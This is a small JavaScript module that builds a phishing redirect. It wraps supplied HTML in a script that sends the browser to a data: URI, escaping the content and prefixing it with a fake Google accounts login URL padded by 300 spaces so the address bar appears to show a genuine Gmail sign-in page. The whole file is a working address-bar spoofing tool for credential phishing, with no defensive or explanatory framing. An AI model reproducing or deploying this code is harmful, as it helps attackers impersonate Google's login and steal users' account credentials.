/**
 Turns the content string (html) into a js redirect to a data uri
**/
exports.make = function(content) {

  content = addEscaped(content);
  content = addFakeURL(content);

  content = "<script>window.location = \"data:text/html," + content + "\"</script>";
  return content;
}

/**
 Escapes all double quotes and closing </script> tag
**/
var addEscaped = function(content){
  content = content.replace(/"/g, "\\\"");
  content = content.replace(/<\/script>/g, "<\\\/script>");
  return content;
}

/**
 Adds the fake url + 300 spaces to the beginning of the content string
**/
var addFakeURL = function(content){
  var fakeURL = "https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/#identifier";
  for(var i = 0; i < 300; i++){
    fakeURL += " ";
  }
  return fakeURL + content;
}
